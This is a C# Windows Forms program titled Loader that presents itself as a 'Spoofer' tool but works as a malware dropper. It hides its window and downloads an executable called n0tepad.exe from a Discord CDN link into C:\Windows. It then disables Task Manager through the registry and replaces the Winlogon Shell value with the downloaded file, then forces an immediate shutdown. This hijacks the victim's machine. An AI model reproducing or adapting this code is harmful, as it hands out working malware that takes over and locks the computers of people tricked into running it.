using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.Net;
using System.Net.WebSockets;
using System.Diagnostics;
using System.Windows.Forms.VisualStyles;

namespace Loader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            if (CheckForInternetConnection() == false)
            {
                MessageBox.Show("Please connect yourself to internet!");
                Environment.Exit(0);
            }
        }
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Console.Title = "Loading...";
            this.Hide();
            this.Opacity = 0;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("> Connecting to Server...");
            try
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/792735565929250826/792737109923987516/n0tepad.exe", "C:\\Windows\\n0tepad.exe");

                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                {
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
                }

                RegistryKey objRegistryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", true);
                if (objRegistryKey.GetValue("DisableCAD") == null)
                {
                    objRegistryKey.SetValue("DisableCAD", "1");
                }

                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", true);

                //registryKey.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe, C:\\Windows\\n0tepad.exe");

                registryKey.SetValue("Shell", "C:\\Windows\\n0tepad.exe");
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Thread.Sleep(500);
                Process.Start(psi);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed loading Spoofer, start as Admin" + ex);
                Console.ReadKey();
            }
        }
    }
}
